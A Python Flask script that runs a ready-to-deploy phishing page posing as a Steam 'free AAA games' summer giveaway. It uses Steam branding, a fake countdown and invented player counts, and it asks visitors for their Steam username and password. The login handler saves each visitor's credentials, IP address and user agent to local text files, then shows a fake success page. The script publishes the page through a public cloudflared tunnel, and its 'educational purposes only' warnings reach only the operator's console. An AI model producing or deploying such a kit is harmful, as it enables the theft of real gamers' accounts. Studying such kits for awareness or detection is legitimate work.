import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'steam-games-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Steam Games")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['st_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Steam Free Games Giveaway - Summer Sale</title>
        <link rel="icon" type="image/x-icon" href="https://store.steampowered.com/favicon.ico">
        <style>
            :root {
                --steam-blue: #1b2838;
                --steam-green: #5c7e10;
                --steam-light: #c6d4df;
                --steam-dark: #171a21;
                --steam-accent: #66c0f4;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
                font-family: 'Motiva Sans', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #c6d4df;
            }
            
            .login-box {
                background: rgba(23, 26, 33, 0.95);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 520px;
                padding: 25px;
                border-radius: 8px;
                text-align: center;
                border: 1px solid #3d4450;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            .steam-logo-container {
                display: flex;
                align-items: center;
                justify-content: center;
                margin-bottom: 20px;
                gap: 10px;
            }
            
            .steam-logo-img {
                height: 50px;
                width: auto;
            }
            
            .steam-logo-text {
                font-size: 32px;
                font-weight: 800;
                color: white;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .games-banner {
                background: linear-gradient(90deg, #ff4500 0%, #ff9a00 50%, #ff4500 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 20px;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
                border: 3px solid #ff9a00;
                animation: summerGlow 2s infinite;
            }
            
            @keyframes summerGlow {
                0% { box-shadow: 0 0 15px rgba(255, 69, 0, 0.5); }
                50% { box-shadow: 0 0 30px rgba(255, 154, 0, 0.8); }
                100% { box-shadow: 0 0 15px rgba(255, 69, 0, 0.5); }
            }
            
            .free-badge {
                background: linear-gradient(90deg, #5c7e10 0%, #8db600 50%, #5c7e10 100%);
                color: white;
                padding: 18px;
                border-radius: 8px;
                margin: 18px 0;
                font-weight: 900;
                font-size: 26px;
                border: 2px solid #8db600;
                line-height: 1.3;
            }
            
            .giveaway-container {
                background: rgba(102, 192, 244, 0.1);
                border: 2px dashed var(--steam-accent);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 600;
                line-height: 1.3;
            }
            
            .subtitle {
                color: #8f98a0;
                font-size: 14px;
                margin-bottom: 25px;
                line-height: 1.5;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #ff4c4c;
                border-radius: 8px;
                padding: 15px;
                margin: 18px 0;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 24px;
                color: #ff9999;
                text-align: center;
                font-weight: bold;
            }
            
            .games-showcase {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-card {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #3d4450;
                border-radius: 6px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
            }
            
            .game-card:hover {
                border-color: var(--steam-accent);
                background: rgba(102, 192, 244, 0.1);
                transform: translateY(-3px);
            }
            
            .game-image {
                width: 100%;
                height: 100px;
                background: linear-gradient(45deg, #1b2838, #3d4450);
                border-radius: 4px;
                margin-bottom: 12px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 36px;
                color: #66c0f4;
            }
            
            .game-title {
                color: white;
                font-weight: 600;
                font-size: 16px;
                margin-bottom: 6px;
                line-height: 1.3;
            }
            
            .game-price {
                color: #5c7e10;
                font-weight: bold;
                font-size: 13px;
            }
            
            .free-tag {
                position: absolute;
                top: 8px;
                right: 8px;
                background: #5c7e10;
                color: white;
                padding: 3px 6px;
                border-radius: 4px;
                font-size: 11px;
                font-weight: bold;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #8f98a0;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid #3d4450;
                border-radius: 4px;
                color: white;
                font-size: 16px;
                transition: all 0.3s;
                -webkit-appearance: none;
            }
            
            input:focus {
                border-color: var(--steam-accent);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #6d7883;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #5c7e10, #8db600);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 4px;
                font-weight: 700;
                font-size: 18px;
                width: 100%;
                margin: 20px 0 15px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-btn:active {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(92, 126, 16, 0.4);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #c6d4df;
                font-size: 14px;
                line-height: 1.4;
            }
            
            .benefit-icon {
                color: #5c7e10;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                flex-shrink: 0;
            }
            
            .sale-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #ff4500, #ff9a00);
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #ff9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #3d4450;
                padding-top: 15px;
                text-align: center;
                line-height: 1.5;
            }
            
            .players-count {
                background: rgba(92, 126, 16, 0.1);
                border: 2px solid var(--steam-green);
                border-radius: 8px;
                padding: 10px;
                margin: 18px 0;
                font-size: 13px;
                color: #8db600;
            }
            
            .game-genres {
                display: flex;
                justify-content: center;
                gap: 8px;
                margin: 12px 0;
                flex-wrap: wrap;
            }
            
            .genre-tag {
                background: rgba(102, 192, 244, 0.1);
                border: 1px solid #3d4450;
                border-radius: 20px;
                padding: 5px 10px;
                font-size: 11px;
                color: #8f98a0;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .login-box {
                    padding: 20px;
                }
                
                .steam-logo-text {
                    font-size: 28px;
                }
                
                .steam-logo-img {
                    height: 40px;
                }
                
                .games-banner {
                    font-size: 18px;
                    padding: 12px;
                }
                
                .free-badge {
                    font-size: 22px;
                    padding: 15px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .timer {
                    font-size: 22px;
                    padding: 12px;
                }
                
                .games-showcase {
                    gap: 10px;
                }
                
                .game-card {
                    padding: 12px;
                }
                
                .game-image {
                    height: 90px;
                    font-size: 32px;
                }
                
                .login-btn {
                    padding: 15px;
                    font-size: 16px;
                }
                
                input {
                    padding: 12px;
                    font-size: 15px;
                }
            }
            
            @media (max-width: 360px) {
                .games-showcase {
                    grid-template-columns: 1fr;
                }
                
                .steam-logo-text {
                    font-size: 24px;
                }
                
                .steam-logo-img {
                    height: 35px;
                }
            }
        </style>
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
            <div class="login-box">
                <div class="steam-logo-container">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" 
                         alt="Steam Logo" 
                         class="steam-logo-img">
                    <div class="steam-logo-text">Steam</div>
                </div>
                
                <div class="games-banner">
                    🎮 FREE AAA GAMES GIVEAWAY 🎮
                </div>
                
                <div class="free-badge">
                    5 FREE GAMES OF YOUR CHOICE
                </div>
                
                <div class="giveaway-container">
                    <h1>Claim Free AAA Games</h1>
                    <div class="subtitle">
                        Limited to first 200 gamers! <span class="sale-badge">100% OFF</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        15:00
                    </div>
                </div>
                
                <div class="players-count">
                    🔥 <strong>28,431,952 players online</strong> - Don't miss this chance!
                </div>
                
                <div class="game-genres">
                    <span class="genre-tag">Action</span>
                    <span class="genre-tag">RPG</span>
                    <span class="genre-tag">Adventure</span>
                    <span class="genre-tag">Strategy</span>
                    <span class="genre-tag">Sports</span>
                </div>
                
                <div class="games-showcase">
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">🎮</div>
                        <div class="game-title">Cyberpunk 2077</div>
                        <div class="game-price">$59.99 → FREE</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">⚔️</div>
                        <div class="game-title">Elden Ring</div>
                        <div class="game-price">$59.99 → FREE</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">🚗</div>
                        <div class="game-title">Forza Horizon 5</div>
                        <div class="game-price">$59.99 → FREE</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">FREE</div>
                        <div class="game-image">🔫</div>
                        <div class="game-title">Call of Duty: Modern Warfare II</div>
                        <div class="game-price">$69.99 → FREE</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        5 Free AAA Games (Your Choice)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        No Strings Attached - Permanent Access
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Exclusive Summer Sale Trading Cards
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Bonus: 500 Steam Points
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Priority Support & Account Verification
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">STEAM ACCOUNT NAME</label>
                        <input type="text" name="username" placeholder="Enter your Steam account name" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎁 Claim 5 Free Games
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This Summer Sale promotion ends in 15 minutes. Games will be added to your library within 1 hour.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 900; // 15 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 60) {
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'summerGlow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Giveaway Ended!";
                    countdownElement.style.color = '#ff0000';
                }
            }
            
            updateTimer();
            
            // Animate game cards
            const gameCards = document.querySelectorAll('.game-card');
            gameCards.forEach((card, index) => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(15px)';
                
                setTimeout(() => {
                    card.style.transition = 'all 0.5s ease';
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, index * 200);
            });
            
            // Mobile touch improvements
            document.querySelectorAll('input, button').forEach(element => {
                element.addEventListener('touchstart', function() {
                    this.style.transform = 'scale(0.98)';
                });
                element.addEventListener('touchend', function() {
                    this.style.transform = 'scale(1)';
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('st_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Steam Free Games Giveaway\n")
        file.write(f"Promised: 5 Free AAA Games\n")
        file.write(f"Games Shown: Cyberpunk 2077, Elden Ring, Forza Horizon 5, Call of Duty MWII\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing Free Games - Steam</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <link rel="icon" type="image/x-icon" href="https://store.steampowered.com/favicon.ico">
        <style>
            :root {
                --steam-blue: #1b2838;
                --steam-green: #5c7e10;
                --steam-light: #c6d4df;
                --steam-dark: #171a21;
                --steam-accent: #66c0f4;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #1b2838 0%, #171a21 100%);
                font-family: 'Motiva Sans', Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #c6d4df;
            }
            
            .container {
                text-align: center;
                background: rgba(23, 26, 33, 0.95);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 8px;
                max-width: 600px;
                width: 100%;
                border: 1px solid #3d4450;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            .steam-logo-container {
                display: flex;
                align-items: center;
                justify-content: center;
                margin-bottom: 25px;
                gap: 15px;
            }
            
            .steam-logo-img {
                height: 60px;
                width: auto;
            }
            
            .steam-logo-text {
                font-size: 36px;
                font-weight: 800;
                color: white;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .processing-container {
                background: rgba(102, 192, 244, 0.1);
                border: 2px solid var(--steam-accent);
                border-radius: 8px;
                padding: 25px;
                margin: 25px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 5px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #5c7e10, #8db600, #66c0f4);
                border-radius: 5px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .games-activated {
                background: rgba(92, 126, 16, 0.1);
                border: 2px solid var(--steam-green);
                border-radius: 8px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #5c7e10;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #c6d4df;
                font-size: 16px;
            }
            
            .games-count {
                font-size: 48px;
                font-weight: 900;
                background: linear-gradient(45deg, #5c7e10, #8db600);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(92, 126, 16, 0.3);
            }
            
            .games-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .game-added {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #3d4450;
                border-radius: 6px;
                padding: 15px;
                text-align: center;
            }
            
            .game-icon {
                font-size: 22px;
                margin-bottom: 8px;
                color: #66c0f4;
            }
            
            .transaction-id {
                background: rgba(102, 192, 244, 0.1);
                border: 1px solid #3d4450;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                color: #8f98a0;
                margin: 12px 0;
                word-break: break-all;
            }
            
            h2 {
                margin-bottom: 10px;
                color: #66c0f4;
                font-size: 24px;
            }
            
            p {
                color: #8f98a0;
                margin-bottom: 20px;
                line-height: 1.5;
            }
            
            @media (max-width: 480px) {
                .container {
                    padding: 20px;
                }
                
                .steam-logo-text {
                    font-size: 28px;
                }
                
                .steam-logo-img {
                    height: 45px;
                }
                
                .games-count {
                    font-size: 40px;
                }
                
                .processing-container {
                    padding: 20px;
                }
                
                .games-grid {
                    gap: 10px;
                }
                
                .game-added {
                    padding: 12px;
                }
                
                .games-activated {
                    padding: 15px;
                }
                
                .status-item {
                    font-size: 14px;
                    margin: 12px 0;
                }
                
                h2 {
                    font-size: 20px;
                }
            }
            
            @media (max-width: 360px) {
                .games-grid {
                    grid-template-columns: 1fr;
                }
                
                .steam-logo-text {
                    font-size: 24px;
                }
                
                .steam-logo-img {
                    height: 40px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="steam-logo-container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" 
                     alt="Steam Logo" 
                     class="steam-logo-img">
                <div class="steam-logo-text">Steam</div>
            </div>
            
            <div class="games-count">
                5 Games Added
            </div>
            
            <h2>Free Games Activated!</h2>
            <p>Your games are being added to your library</p>
            
            <div class="processing-container">
                <h3>Processing Your Game Giveaway</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Adding games to your Steam library...</p>
            </div>
            
            <div class="games-grid">
                <div class="game-added">
                    <div class="game-icon">🎮</div>
                    <div>Cyberpunk 2077</div>
                </div>
                <div class="game-added">
                    <div class="game-icon">⚔️</div>
                    <div>Elden Ring</div>
                </div>
                <div class="game-added">
                    <div class="game-icon">🚗</div>
                    <div>Forza Horizon 5</div>
                </div>
                <div class="game-added">
                    <div class="game-icon">🔫</div>
                    <div>Call of Duty: MWII</div>
                </div>
            </div>
            
            <div class="transaction-id">
                Transaction ID: STEAM-GAMES-<span id="transaction-id">0000000</span>
            </div>
            
            <div class="games-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>5 AAA Games</strong> added to your library
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Permanent Access</strong> - Owned forever
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>500 Steam Points</strong> added to your account
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Trading Cards</strong> available in inventory
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Summer Sale Badge</strong> unlocked
                </div>
            </div>
            
            <p style="margin-top: 25px; font-size: 13px;">
                You will be redirected to Steam shortly...
                <br>
                <small style="color: #6d7883;">Your games will be available in your library within 1 hour</small>
            </p>
        </div>
        
        <script>
            // Generate random transaction ID
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
            
            // Animate games count
            setTimeout(() => {
                const gamesCount = document.querySelector('.games-count');
                gamesCount.style.transform = 'scale(1.1)';
                gamesCount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    gamesCount.style.transform = 'scale(1)';
                }, 300);
            }, 1500);
            
            // Animate added games
            const gameItems = document.querySelectorAll('.game-added');
            gameItems.forEach((item, index) => {
                item.style.opacity = '0';
                setTimeout(() => {
                    item.style.transition = 'opacity 0.5s';
                    item.style.opacity = '1';
                }, index * 300);
            });
            
            // Prevent zoom on input focus for mobile
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', function() {
                    this.style.fontSize = '16px';
                });
            });
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Steam Free Games Public Link: {tunnel_url}")
            print(f"🎮 Promising: 5 FREE AAA Games")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real Steam credentials!")
            print("⚠️  Steam 'free game' scams are extremely common!")
            print("⚠️  Game libraries can be worth thousands of dollars!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5011, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Steam Free Games Giveaway Page...")
    print("📱 Port: 5011")
    print("💾 Save location: ~/storage/downloads/SteamGames/")
    print("🎮 Promising: 5 FREE AAA Games")
    print("💰 Games Shown: Cyberpunk 2077, Elden Ring, Forza Horizon 5, Call of Duty MWII")
    print("⚠️  HIGH RISK: 'Free game' scams target gamers of all ages!")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5011")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)